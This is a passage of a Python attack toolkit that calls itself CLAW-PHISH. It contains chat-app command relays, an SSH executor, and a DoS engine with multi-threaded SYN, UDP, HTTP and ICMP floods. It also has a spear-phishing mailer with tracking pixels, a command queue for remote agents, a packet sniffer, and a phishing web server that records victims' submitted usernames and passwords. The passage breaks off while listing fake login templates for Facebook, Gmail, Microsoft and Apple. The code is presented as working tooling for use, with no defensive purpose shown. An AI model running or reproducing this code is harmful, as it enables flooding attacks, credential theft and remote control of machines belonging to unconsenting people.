                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        return SIGNAL_AVAILABLE and self.config.get('phone_number')
    
    def start(self):
        if self.setup():
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
            self.running = True
    
    def _run(self):
        try:
            import signal_cli
            self._monitor_messages()
        except:
            logger.error("Signal CLI not available")
    
    def _monitor_messages(self):
        # Simplified monitoring - in production would use signal-cli receive
        while self.running:
            try:
                # Get messages from signal-cli
                result = subprocess.run(
                    ['signal-cli', 'receive', '--number', self.config['phone_number']],
                    capture_output=True, text=True, timeout=30
                )
                
                if result.stdout:
                    # Parse messages and respond
                    for line in result.stdout.splitlines():
                        if line.startswith('Message:'):
                            msg = line.replace('Message:', '').strip()
                            if msg.startswith(self.config.get('prefix', '!')):
                                cmd = msg[1:].strip()
                                resp = self.handler.execute(cmd, 'signal', 'signal_user')
                                self._send_message(resp.get('output', ''))
                time.sleep(5)
            except:
                time.sleep(10)
    
    def _send_message(self, text: str):
        try:
            cmd = ['signal-cli', 'send', '--number', self.config['phone_number']]
            if self.config.get('group_id'):
                cmd.extend(['--group', self.config['group_id']])
            cmd.extend(['--message', text[:4000]])
            subprocess.run(cmd, capture_output=True, timeout=10)
        except:
            pass
    
    def send_message(self, text: str):
        self._send_message(text)

# =====================
# IMESSAGE BOT
# =====================
class iMessageBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "imessage_config.json")):
                with open(os.path.join(CONFIG_DIR, "imessage_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'phone_numbers': [], 'prefix': '!'}
    
    def save_config(self, phone_numbers: List[str], enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'phone_numbers': phone_numbers, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "imessage_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        return IMESSAGE_AVAILABLE and self.config.get('phone_numbers')
    
    def start(self):
        if self.setup():
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
            self.running = True
    
    def _run(self):
        if not IMESSAGE_AVAILABLE:
            logger.error("iMessage only available on macOS")
            return
        
        # Use AppleScript to monitor and send messages
        while self.running:
            try:
                self._monitor_messages()
                time.sleep(5)
            except:
                time.sleep(10)
    
    def _monitor_messages(self):
        try:
            # Get recent messages
            script = """
            tell application "Messages"
                set recentMessages to every message of chat 1
                repeat with msg in recentMessages
                    if msg is not read then
                        set msgText to content of msg
                        set msgSender to handle of sender of msg
                        -- Process message
                    end if
                end repeat
            end tell
            """
            result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True, timeout=10)
            
            if result.stdout:
                for line in result.stdout.splitlines():
                    if line.startswith('!'):
                        cmd = line[1:].strip()
                        resp = self.handler.execute(cmd, 'imessage', 'imessage_user')
                        self._send_message(resp.get('output', ''))
        except:
            pass
    
    def _send_message(self, text: str):
        try:
            for phone in self.config['phone_numbers']:
                script = f'''
                tell application "Messages"
                    set targetService to 1st service whose service type = iMessage
                    set targetBuddy to buddy "{phone}" of targetService
                    send "{text[:4000]}" to targetBuddy
                end tell
                '''
                subprocess.run(['osascript', '-e', script], capture_output=True, timeout=10)
        except:
            pass
    
    def send_message(self, text: str, phone: str = None):
        self._send_message(text)

# =====================
# GOOGLE CHAT BOT
# =====================
class GoogleChatBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "googlechat_config.json")):
                with open(os.path.join(CONFIG_DIR, "googlechat_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'webhook_url': '', 'space_id': '', 'prefix': '/'}
    
    def save_config(self, webhook_url: str, space_id: str = "", enabled: bool = True, prefix: str = '/') -> bool:
        try:
            config = {'enabled': enabled, 'webhook_url': webhook_url, 'space_id': space_id, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "googlechat_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        return self.config.get('webhook_url') is not None
    
    def start(self):
        if self.setup():
            # Google Chat doesn't support inbound messages via webhook
            # Only outbound messages
            self.running = True
    
    def send_message(self, text: str):
        try:
            data = {
                'text': text[:4000]
            }
            headers = {'Content-Type': 'application/json'}
            response = requests.post(self.config['webhook_url'], json=data, headers=headers, timeout=10)
            return response.status_code == 200
        except:
            return False

# =====================
# WHATSAPP BOT
# =====================
class WhatsAppBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "whatsapp_config.json")):
                with open(os.path.join(CONFIG_DIR, "whatsapp_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'phone_number': '', 'prefix': '!'}
    
    def save_config(self, phone_number: str, enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'phone_number': phone_number, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "whatsapp_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        return WHATSAPP_AVAILABLE and self.config.get('phone_number')
    
    def start(self):
        if self.setup():
            self.running = True
            # WhatsApp requires manual intervention for automation
    
    def send_message(self, text: str):
        try:
            import pywhatkit
            pywhatkit.sendwhatmsg_instantly(self.config['phone_number'], text[:4000])
            return True
        except:
            return False

# =====================
# SSH MANAGER
# =====================
class SSHManager:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.connections: Dict[str, paramiko.SSHClient] = {}
    
    def is_available(self) -> bool:
        return PARAMIKO_AVAILABLE
    
    def add_connection(self, name: str, host: str, username: str,
                      password: str = None, key_path: str = None,
                      port: int = 22) -> SSHConnection:
        conn_id = str(uuid.uuid4())[:8]
        conn = SSHConnection(
            id=conn_id,
            name=name,
            host=host,
            port=port,
            username=username,
            password=password,
            key_path=key_path,
            created_at=datetime.datetime.now().isoformat()
        )
        self.db.add_ssh_connection(conn)
        return conn
    
    def connect(self, conn_id: str) -> bool:
        if not self.is_available():
            return False
        
        rows = self.db.get_ssh_connections()
        conn_data = next((c for c in rows if c['id'] == conn_id), None)
        if not conn_data:
            return False
        
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            connect_kwargs = {
                'hostname': conn_data['host'],
                'port': conn_data['port'],
                'username': conn_data['username'],
                'timeout': 30
            }
            
            if conn_data['password_encrypted']:
                connect_kwargs['password'] = conn_data['password_encrypted']
            elif conn_data['key_path'] and os.path.exists(conn_data['key_path']):
                connect_kwargs['key_filename'] = conn_data['key_path']
            
            client.connect(**connect_kwargs)
            self.connections[conn_id] = client
            
            self.db.conn.execute(
                "UPDATE ssh_connections SET status = 'connected', last_used = CURRENT_TIMESTAMP WHERE id = ?",
                (conn_id,)
            )
            self.db.conn.commit()
            return True
        except Exception as e:
            print(f"SSH connection error: {e}")
            return False
    
    def disconnect(self, conn_id: str):
        if conn_id in self.connections:
            try:
                self.connections[conn_id].close()
                del self.connections[conn_id]
            except:
                pass
        
        self.db.conn.execute(
            "UPDATE ssh_connections SET status = 'disconnected' WHERE id = ?",
            (conn_id,)
        )
        self.db.conn.commit()
    
    def execute_command(self, conn_id: str, command: str, timeout: int = 30) -> CommandResult:
        start_time = time.time()
        
        if conn_id not in self.connections:
            if not self.connect(conn_id):
                return CommandResult(False, "", 0, "Not connected")
        
        client = self.connections[conn_id]
        
        try:
            stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
            output = stdout.read().decode('utf-8', errors='ignore')
            error = stderr.read().decode('utf-8', errors='ignore')
            exit_code = stdout.channel.recv_exit_status()
            
            execution_time = time.time() - start_time
            
            self.db.log_ssh_command(conn_id, command, output, exit_code, execution_time)
            
            return CommandResult(
                success=exit_code == 0,
                output=output + ("\n" + error if error else ""),
                execution_time=execution_time,
                error=None if exit_code == 0 else error
            )
        except Exception as e:
            execution_time = time.time() - start_time
            return CommandResult(False, "", execution_time, str(e))
    
    def get_connections(self) -> List[Dict]:
        rows = self.db.get_ssh_connections()
        for row in rows:
            row['connected'] = row['id'] in self.connections
        return rows

# =====================
# TRAFFIC GENERATOR
# =====================
class TrafficGeneratorEngine:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.active_generators: Dict[str, TrafficGenerator] = {}
        self.stop_events: Dict[str, threading.Event] = {}
    
    def get_available_types(self) -> List[str]:
        types = [t.value for t in TrafficType]
        return types
    
    def generate(self, traffic_type: str, target_ip: str, duration: int,
                port: int = None, packet_rate: int = 100) -> TrafficGenerator:
        try:
            ipaddress.ip_address(target_ip)
        except:
            raise ValueError(f"Invalid IP: {target_ip}")
        
        if port is None:
            port_map = {
                'http_get': 80, 'http_post': 80, 'https': 443,
                'dns': 53, 'tcp_syn': 80, 'tcp_connect': 80, 'udp': 53
            }
            port = port_map.get(traffic_type, 0)
        
        generator_id = f"{target_ip}_{traffic_type}_{int(time.time())}"
        
        generator = TrafficGenerator(
            id=generator_id,
            traffic_type=traffic_type,
            target_ip=target_ip,
            target_port=port,
            duration=duration,
            start_time=datetime.datetime.now().isoformat(),
            status="running"
        )
        
        stop_event = threading.Event()
        self.stop_events[generator_id] = stop_event
        
        thread = threading.Thread(
            target=self._run_generator,
            args=(generator, packet_rate, stop_event),
            daemon=True
        )
        thread.start()
        
        self.active_generators[generator_id] = generator
        return generator
    
    def _run_generator(self, generator: TrafficGenerator, packet_rate: int,
                      stop_event: threading.Event):
        start_time = time.time()
        end_time = start_time + generator.duration
        packets_sent = 0
        bytes_sent = 0
        interval = 1.0 / max(1, packet_rate)
        
        func = self._get_generator_func(generator.traffic_type)
        
        while time.time() < end_time and not stop_event.is_set():
            try:
                size = func(generator.target_ip, generator.target_port)
                if size > 0:
                    packets_sent += 1
                    bytes_sent += size
                time.sleep(interval)
            except Exception as e:
                time.sleep(0.1)
        
        generator.packets_sent = packets_sent
        generator.bytes_sent = bytes_sent
        generator.end_time = datetime.datetime.now().isoformat()
        generator.status = "completed" if not stop_event.is_set() else "stopped"
        
        self.db.log_traffic(generator)
    
    def _get_generator_func(self, traffic_type: str):
        funcs = {
            'icmp': self._icmp,
            'tcp_syn': self._tcp_syn,
            'tcp_ack': self._tcp_ack,
            'tcp_connect': self._tcp_connect,
            'udp': self._udp,
            'http_get': self._http_get,
            'http_post': self._http_post,
            'https': self._https,
            'dns': self._dns,
            'arp': self._arp,
            'mixed': self._mixed,
            'random': self._random
        }
        return funcs.get(traffic_type, self._icmp)
    
    def _icmp(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/ICMP()
                send(packet, verbose=False)
                return len(packet)
            else:
                subprocess.run(['ping', '-c', '1', '-W', '1', target],
                              capture_output=True, timeout=2)
                return 64
        except:
            return 0
    
    def _tcp_syn(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="S")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _tcp_ack(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="A")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _tcp_connect(self, target: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((target, port))
            sock.close()
            return 40 if result == 0 else 0
        except:
            return 0
    
    def _udp(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/UDP(dport=port)/b"CLAW-PHISH"
                send(packet, verbose=False)
                return len(packet)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(b"CLAW-PHISH", (target, port))
                sock.close()
                return 64
        except:
            return 0
    
    def _http_get(self, target: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target, port, timeout=2)
            conn.request("GET", "/", headers={"User-Agent": "CLAW-PHISH"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _http_post(self, target: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target, port, timeout=2)
            conn.request("POST", "/", body="test=data",
                        headers={"User-Agent": "CLAW-PHISH"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _https(self, target: str, port: int) -> int:
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(target, port, context=context, timeout=3)
            conn.request("GET", "/", headers={"User-Agent": "CLAW-PHISH"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 200
        except:
            return 0
    
    def _dns(self, target: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            tid = random.randint(0, 65535).to_bytes(2, 'big')
            flags = b'\x01\x00'
            questions = b'\x00\x01'
            query = b'\x06google\x03com\x00\x00\x01\x00\x01'
            packet = tid + flags + questions + b'\x00\x00\x00\x00\x00\x00' + query
            sock.sendto(packet, (target, port))
            sock.close()
            return len(packet)
        except:
            return 0
    
    def _arp(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                local_mac = self._get_local_mac()
                packet = Ether(src=local_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target)
                sendp(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _mixed(self, target: str, port: int) -> int:
        funcs = [self._icmp, self._tcp_syn, self._udp, self._http_get]
        return random.choice(funcs)(target, port)
    
    def _random(self, target: str, port: int) -> int:
        types = ['icmp', 'tcp_syn', 'udp', 'http_get', 'dns']
        return self._get_generator_func(random.choice(types))(target, port)
    
    def _get_local_mac(self) -> str:
        try:
            import uuid
            mac = uuid.getnode()
            return ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))
        except:
            return "00:11:22:33:44:55"
    
    def stop(self, generator_id: str = None) -> bool:
        if generator_id:
            if generator_id in self.stop_events:
                self.stop_events[generator_id].set()
                return True
        else:
            for event in self.stop_events.values():
                event.set()
            return True
        return False
    
    def get_active(self) -> List[Dict]:
        return [
            {
                'id': g.id,
                'traffic_type': g.traffic_type,
                'target_ip': g.target_ip,
                'duration': g.duration,
                'packets_sent': g.packets_sent,
                'status': g.status
            }
            for g in self.active_generators.values()
        ]

# =====================
# NIKTO SCANNER
# =====================
class NiktoScanner:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.available = self._check_available()
    
    def _check_available(self) -> bool:
        return shutil.which('nikto') is not None
    
    def scan(self, target: str, options: Dict = None) -> Dict:
        start_time = time.time()
        options = options or {}
        
        if not self.available:
            return {'success': False, 'error': 'Nikto not installed'}
        
        try:
            timestamp = int(time.time())
            output_file = os.path.join(NIKTO_RESULTS_DIR, f"nikto_{target.replace('/', '_')}_{timestamp}.json")
            
            cmd = ['nikto', '-host', target, '-Format', 'json', '-o', output_file]
            if options.get('ssl'):
                cmd.append('-ssl')
            if options.get('port'):
                cmd.extend(['-port', str(options['port'])])
            if options.get('tuning'):
                cmd.extend(['-tuning', options['tuning']])
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            scan_time = time.time() - start_time
            
            vulnerabilities = []
            if os.path.exists(output_file):
                try:
                    with open(output_file, 'r') as f:
                        data = json.load(f)
                        if isinstance(data, dict) and 'vulnerabilities' in data:
                            vulnerabilities = data['vulnerabilities']
                except:
                    pass
            
            self.db.log_nikto_scan(target, vulnerabilities, output_file, scan_time, result.returncode == 0)
            
            return {
                'success': result.returncode == 0,
                'target': target,
                'vulnerabilities': vulnerabilities,
                'scan_time': scan_time,
                'output_file': output_file
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Scan timed out'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def get_available_scan_types(self) -> List[str]:
        return ["full", "ssl", "cgi", "sql", "xss"]

# =====================
# DOS ATTACK ENGINE
# =====================
class DOSEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.running_attacks: Dict[str, threading.Event] = {}
    
    def syn_flood(self, target_ip: str, port: int, duration: int, threads: int = 50) -> Dict:
        return self._attack("syn", target_ip, port, duration, threads)
    
    def udp_flood(self, target_ip: str, port: int, duration: int, threads: int = 50) -> Dict:
        return self._attack("udp", target_ip, port, duration, threads)
    
    def http_flood(self, target_ip: str, port: int, duration: int, threads: int = 50) -> Dict:
        return self._attack("http", target_ip, port, duration, threads)
    
    def icmp_flood(self, target_ip: str, duration: int, threads: int = 50) -> Dict:
        return self._attack("icmp", target_ip, 0, duration, threads)
    
    def _attack(self, attack_type: str, target_ip: str, port: int, duration: int, threads: int) -> Dict:
        max_threads = self.config.get('dos.max_threads', 100)
        if threads > max_threads:
            return {'success': False, 'error': f'Threads exceed maximum ({max_threads})'}
        
        try:
            ipaddress.ip_address(target_ip)
        except:
            return {'success': False, 'error': f'Invalid IP: {target_ip}'}
        
        attack_id = f"{attack_type}_{target_ip}_{int(time.time())}"
        stop_event = threading.Event()
        self.running_attacks[attack_id] = stop_event
        
        packets_sent = 0
        
        def attack_thread():
            nonlocal packets_sent
            end_time = time.time() + duration
            func = self._get_attack_func(attack_type)
            
            while time.time() < end_time and not stop_event.is_set():
                try:
                    size = func(target_ip, port)
                    if size > 0:
                        packets_sent += 1
                except:
                    pass
        
        attack_threads = []
        for _ in range(threads):
            t = threading.Thread(target=attack_thread, daemon=True)
            t.start()
            attack_threads.append(t)
        
        def monitor():
            for t in attack_threads:
                t.join(timeout=duration + 2)
            self.db.log_dos_attack(attack_type, target_ip, port, duration, packets_sent, 'completed', 'system')
            if attack_id in self.running_attacks:
                del self.running_attacks[attack_id]
        
        threading.Thread(target=monitor, daemon=True).start()
        
        return {
            'success': True,
            'attack_id': attack_id,
            'type': attack_type,
            'target': target_ip,
            'port': port,
            'duration': duration,
            'threads': threads,
            'message': f"{attack_type.upper()} flood started on {target_ip}:{port} for {duration}s"
        }
    
    def _get_attack_func(self, attack_type: str):
        funcs = {
            'syn': self._send_syn,
            'udp': self._send_udp,
            'http': self._send_http,
            'icmp': self._send_icmp
        }
        return funcs.get(attack_type, self._send_udp)
    
    def _send_syn(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="S")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _send_udp(self, target: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = b"X" * 1024
            sock.sendto(data, (target, port))
            sock.close()
            return len(data) + 8
        except:
            return 0
    
    def _send_http(self, target: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target, port, timeout=1)
            conn.request("GET", "/", headers={"User-Agent": "CLAW-PHISH"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _send_icmp(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/ICMP()
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def stop(self, attack_id: str = None) -> bool:
        if attack_id:
            if attack_id in self.running_attacks:
                self.running_attacks[attack_id].set()
                return True
        else:
            for event in self.running_attacks.values():
                event.set()
            return True
        return False
    
    def get_active(self) -> List[Dict]:
        return [
            {
                'id': attack_id,
                'type': attack_id.split('_')[0] if '_' in attack_id else 'unknown',
                'target': attack_id.split('_')[1] if '_' in attack_id else 'unknown'
            }
            for attack_id in self.running_attacks.keys()
        ]

# =====================
# SPEAR PHISHING ENGINE
# =====================
class SpearPhishingEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
    
    def create_campaign(self, name: str, template: str, subject: str, from_email: str,
                       targets: List[Dict], scheduled_time: str = None) -> SpearPhishingCampaign:
        campaign = SpearPhishingCampaign(
            id=str(uuid.uuid4())[:8],
            name=name,
            template=template,
            subject=subject,
            from_email=from_email,
            targets=targets,
            scheduled_time=scheduled_time,
            created_at=datetime.datetime.now().isoformat()
        )
        self.db.save_spear_phishing_campaign(campaign)
        return campaign
    
    def send_campaign(self, campaign_id: str) -> Dict:
        campaigns = self.db.get_spear_phishing_campaigns()
        campaign_data = next((c for c in campaigns if c['id'] == campaign_id), None)
        if not campaign_data:
            return {'success': False, 'error': 'Campaign not found'}
        
        smtp_server = self.config.get('spear_phishing.smtp_server', '')
        smtp_port = self.config.get('spear_phishing.smtp_port', 587)
        smtp_username = self.config.get('spear_phishing.smtp_username', '')
        smtp_password = self.config.get('spear_phishing.smtp_password', '')
        
        if not smtp_server:
            return {'success': False, 'error': 'SMTP server not configured'}
        
        sent_count = 0
        targets = json.loads(campaign_data['targets']) if campaign_data['targets'] else []
        
        for target in targets:
            try:
                msg = email.message.EmailMessage()
                msg['Subject'] = campaign_data['subject']
                msg['From'] = campaign_data['from_email']
                msg['To'] = target.get('email', '')
                
                template = campaign_data['template']
                for key, value in target.items():
                    template = template.replace(f"{{{{{key}}}}}", str(value))
                
                # Add tracking pixel
                tracking_url = f"{self.config.get('spear_phishing.tracking_server', 'http://localhost:5000')}/track/{campaign_id}/{target.get('email', '')}"
                template += f'\n<img src="{tracking_url}" width="1" height="1">'
                
                if '<html' in template.lower():
                    msg.set_content(template, subtype='html')
                else:
                    msg.set_content(template)
                
                with smtplib.SMTP(smtp_server, smtp_port) as server:
                    server.starttls()
                    server.login(smtp_username, smtp_password)
                    server.send_message(msg)
                
                sent_count += 1
            except Exception as e:
                print(f"Failed to send to {target.get('email', 'unknown')}: {e}")
        
        self.db.conn.execute(
            "UPDATE spear_phishing_campaigns SET sent_count = ?, status = 'sent' WHERE id = ?",
            (sent_count, campaign_id)
        )
        self.db.conn.commit()
        
        return {
            'success': True,
            'campaign_id': campaign_id,
            'sent_count': sent_count,
            'total_targets': len(targets)
        }
    
    def track_open(self, campaign_id: str, target_email: str, tracking_id: str = None):
        self.db.track_email_open(campaign_id, target_email)
    
    def track_click(self, campaign_id: str, target_email: str):
        self.db.track_email_click(campaign_id, target_email)
    
    def get_campaigns(self) -> List[Dict]:
        return self.db.get_spear_phishing_campaigns()

# =====================
# AGENT ENGINE
# =====================
class AgentEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.heartbeat_timer = None
    
    def register_agent(self, name: str, ip_address: str) -> Dict:
        agent_id = str(uuid.uuid4())[:8]
        self.db.register_agent(agent_id, name, ip_address)
        return {
            'success': True,
            'agent_id': agent_id,
            'name': name,
            'ip_address': ip_address,
            'message': f'Agent {name} registered'
        }
    
    def send_command(self, agent_id: str, command: str) -> bool:
        return self.db.add_agent_command(agent_id, command)
    
    def poll_commands(self, agent_id: str) -> List[Dict]:
        return self.db.get_pending_agent_commands(agent_id)
    
    def submit_result(self, command_id: int, result: str, status: str = "completed"):
        self.db.update_agent_command_result(command_id, result, status)
    
    def start_heartbeat(self):
        def heartbeat():
            agents = self.db.get_agents()
            for agent in agents:
                self.db.update_agent_heartbeat(agent['id'])
            
            if self.heartbeat_timer:
                self.heartbeat_timer.cancel()
            
            interval = self.config.get('agent.heartbeat_interval', 30)
            self.heartbeat_timer = threading.Timer(interval, heartbeat)
            self.heartbeat_timer.daemon = True
            self.heartbeat_timer.start()
        
        heartbeat()
    
    def stop_heartbeat(self):
        if self.heartbeat_timer:
            self.heartbeat_timer.cancel()
            self.heartbeat_timer = None
    
    def get_agents(self) -> List[Dict]:
        return self.db.get_agents()
    
    def get_agent(self, agent_id: str) -> Optional[Dict]:
        return self.db.get_agent(agent_id)

# =====================
# NETWORK MONITOR
# =====================
class NetworkMonitor:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.running = False
        self.packet_count = 0
        self.interface = config.get('network_monitor.interface', 'eth0')
        self.promiscuous = config.get('network_monitor.promiscuous', False)
        self.capture_limit = config.get('network_monitor.packet_capture_limit', 1000)
    
    def start(self):
        self.running = True
        threading.Thread(target=self._monitor_loop, daemon=True).start()
        print(f"{Colors.SUCCESS}✅ Network monitor started on {self.interface}{Colors.RESET}")
    
    def stop(self):
        self.running = False
    
    def _monitor_loop(self):
        while self.running:
            try:
                if SCAPY_AVAILABLE:
                    self._scapy_monitor()
                else:
                    self._socket_monitor()
            except Exception as e:
                logger.error(f"Network monitor error: {e}")
                time.sleep(5)
    
    def _scapy_monitor(self):
        from scapy.all import sniff
        sniff(iface=self.interface, prn=self._process_packet, store=0,
              promisc=self.promiscuous, count=self.capture_limit)
    
    def _socket_monitor(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
        sock.bind((self.interface, 0))
        sock.settimeout(1)
        
        while self.running:
            try:
                data, addr = sock.recvfrom(65535)
                self._process_packet(data)
            except socket.timeout:
                continue
            except Exception as e:
                logger.error(f"Socket monitor error: {e}")
                break
        
        sock.close()
    
    def _process_packet(self, packet):
        self.packet_count += 1
        
        try:
            if SCAPY_AVAILABLE and hasattr(packet, 'haslayer'):
                if packet.haslayer(IP):
                    ip = packet[IP]
                    src_ip = ip.src
                    dst_ip = ip.dst
                    protocol = ip.proto
                    size = len(packet)
                    
                    src_port = 0
                    dst_port = 0
                    payload = ""
                    
                    if packet.haslayer(TCP):
                        src_port = packet[TCP].sport
                        dst_port = packet[TCP].dport
                        protocol = "TCP"
                    elif packet.haslayer(UDP):
                        src_port = packet[UDP].sport
                        dst_port = packet[UDP].dport
                        protocol = "UDP"
                    elif packet.haslayer(ICMP):
                        protocol = "ICMP"
                    
                    self.db.save_network_packet(src_ip, dst_ip, src_port, dst_port, protocol, size, str(packet))
            else:
                self.db.save_network_packet("unknown", "unknown", 0, 0, "unknown", len(packet), "")
        except Exception as e:
            logger.error(f"Packet processing error: {e}")
    
    def get_packets(self, limit: int = 100) -> List[Dict]:
        return self.db.get_network_packets(limit)
    
    def get_statistics(self) -> Dict:
        packets = self.db.get_network_packets(1000)
        stats = {
            'total_packets': len(packets),
            'protocols': Counter(),
            'top_sources': Counter(),
            'top_dests': Counter()
        }
        
        for p in packets:
            stats['protocols'][p.get('protocol', 'unknown')] += 1
            stats['top_sources'][p.get('source_ip', 'unknown')] += 1
            stats['top_dests'][p.get('dest_ip', 'unknown')] += 1
        
        return stats

# =====================
# PHISHING SERVER
# =====================
class PhishingRequestHandler(BaseHTTPRequestHandler):
    server_instance = None
    
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        
        if self.server_instance and self.server_instance.html_content:
            self.wfile.write(self.server_instance.html_content.encode())
        
        if self.server_instance and self.server_instance.db and self.server_instance.link_id:
            self.server_instance.db.conn.execute(
                "UPDATE phishing_links SET clicks = clicks + 1 WHERE id = ?",
                (self.server_instance.link_id,)
            )
            self.server_instance.db.conn.commit()
    
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode()
        form_data = urllib.parse.parse_qs(post_data)
        
        username = form_data.get('email', form_data.get('username', ['']))[0]
        password = form_data.get('password', [''])[0]
        client_ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent', 'Unknown')
        
        if self.server_instance and self.server_instance.db and username and password:
            self.server_instance.db.save_captured_credential(
                self.server_instance.link_id, username, password, client_ip, user_agent
            )
            print(f"\n{Colors.ERROR}🎣 CREDENTIALS CAPTURED!{Colors.RESET}")
            print(f"  IP: {client_ip}")
            print(f"  Username: {username}")
            print(f"  Password: {password}")
        
        self.send_response(302)
        self.send_header('Location', 'https://www.google.com')
        self.end_headers()

class PhishingServer:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.server = None
        self.running = False
        self.link_id = None
        self.html_content = None
    
    def start(self, link_id: str, platform: str, html_content: str, port: int = 8080) -> bool:
        try:
            self.link_id = link_id
            self.html_content = html_content
            
            handler = PhishingRequestHandler
            handler.server_instance = self
            
            self.server = socketserver.TCPServer(("0.0.0.0", port), handler)
            thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            thread.start()
            self.running = True
            return True
        except:
            return False
    
    def stop(self):
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            self.running = False
    
    def get_url(self) -> str:
        return f"http://{self._get_local_ip()}:8080"
    
    def _get_local_ip(self) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

# =====================
# SOCIAL ENGINEERING TOOLS
# =====================
class SocialEngineeringTools:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.phishing_server = PhishingServer(db)
        self.active_links = {}
    
    def generate_phishing_link(self, platform: str) -> Dict:
        link_id = str(uuid.uuid4())[:8]
        
        templates = {
            'facebook': self._facebook_template(),
            'instagram': self._instagram_template(),
            'twitter': self._twitter_template(),
            'gmail': self._gmail_template(),
            'linkedin': self._linkedin_template(),
            'microsoft': self._microsoft_template(),
            'google': self._google_template(),
            'apple': self._apple_template(),
